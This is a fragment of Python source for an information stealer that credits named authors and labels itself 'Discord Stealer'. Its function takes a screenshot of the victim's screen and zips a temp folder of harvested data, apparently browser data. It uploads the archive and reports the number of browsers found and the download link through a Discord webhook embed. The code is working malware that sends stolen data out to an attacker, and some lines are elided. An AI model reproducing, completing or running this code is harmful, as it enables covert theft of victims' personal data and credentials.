...
def extract_data_browser(webhook: str, path = "\\AppData\\Local\\Temp\\Info"):
    ...
    sss = ImageGrab.grab()
    try:
        sss.save(user + path + "\\ss.png")
        sstook = True
    except:
        sstook = False

    ss = {"file": open(user + path + "\\ss.png", "rb")}
    try:
        os.remove(user + path + "\\ss.png")
    except:
        pass

    
    shutil.make_archive(user + path , 'zip', user+ path)

    files = {'file': open(user + path + '\\Info.zip', 'rb')}
    global response
    ...
    "embeds": [
        {
            ...
            "fields": [
                {
                    "name": "🌐Total Of Browser Found:",
                    "value": f"**`{total_browsers}`**",
                },
                {
                    "name": "Link Of The File:",
                    "value": f"**`{response['link']}`**",
                }
            ],
            "footer": {
                "text": "Discord Stealer | Created By yashing2 and VMS_SHOP and phantoms_._"
            },
            "thumbnail": {
